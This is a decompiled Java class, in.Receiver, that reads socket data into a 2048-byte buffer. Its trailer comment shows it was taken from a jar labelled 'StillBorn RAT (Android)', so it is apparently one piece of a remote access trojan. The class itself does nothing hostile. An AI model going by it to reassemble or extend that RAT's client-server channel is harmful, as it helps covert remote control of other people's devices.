/*  1:   */ package in;
/*  2:   */ 
/*  3:   */ import java.io.IOException;
/*  4:   */ import java.io.InputStream;
/*  5:   */ import java.net.Socket;
/*  6:   */ import java.net.SocketException;
/*  7:   */ import java.nio.ByteBuffer;
/*  8:   */ 
/*  9:   */ public class Receiver
/* 10:   */ {
/* 11:   */   private Socket socket;
/* 12:   */   private byte[] received_data;
/* 13:   */   private ByteBuffer buffer;
/* 14:   */   private InputStream is;
/* 15:   */   
/* 16:   */   public Receiver(Socket s)
/* 17:   */     throws IOException
/* 18:   */   {
/* 19:41 */     this.socket = s;
/* 20:42 */     this.is = this.socket.getInputStream();
/* 21:   */     
/* 22:44 */     this.received_data = new byte[2048];
/* 23:45 */     this.buffer = ByteBuffer.allocate(2048);
/* 24:   */   }
/* 25:   */   
/* 26:   */   public ByteBuffer read()
/* 27:   */     throws IOException, SocketException
/* 28:   */   {
/* 29:49 */     int n = 0;
/* 30:   */     
/* 31:51 */     n = this.is.read(this.received_data);
/* 32:   */     
/* 33:53 */     this.buffer.clear();
/* 34:54 */     this.buffer = ByteBuffer.wrap(this.received_data, 0, n);
/* 35:   */     
/* 36:   */ 
/* 37:57 */     return this.buffer;
/* 38:   */   }
/* 39:   */   
/* 40:   */   public ByteBuffer read(ByteBuffer b)
/* 41:   */     throws IOException, SocketException
/* 42:   */   {
/* 43:61 */     int n = 0;
/* 44:   */     
/* 45:63 */     byte[] theRest = null;
/* 46:65 */     if ((b.position() > 0) && (b.position() < 15))
/* 47:   */     {
/* 48:67 */       theRest = new byte[b.position()];
/* 49:68 */       b.flip();
/* 50:69 */       b.get(theRest, 0, b.limit());
/* 51:70 */       System.arraycopy(theRest, 0, this.received_data, 0, theRest.length);
/* 52:   */       
/* 53:   */ 
/* 54:   */ 
/* 55:   */ 
/* 56:75 */       n = this.is.read(this.received_data, theRest.length, 2048 - theRest.length);
/* 57:76 */       n += theRest.length;
/* 58:   */     }
/* 59:   */     else
/* 60:   */     {
/* 61:79 */       n = this.is.read(this.received_data);
/* 62:   */     }
/* 63:83 */     this.buffer = ByteBuffer.wrap(this.received_data, 0, n);
/* 64:   */     
/* 65:   */ 
/* 66:86 */     return this.buffer;
/* 67:   */   }
/* 68:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     in.Receiver
 * JD-Core Version:    0.7.0.1
 */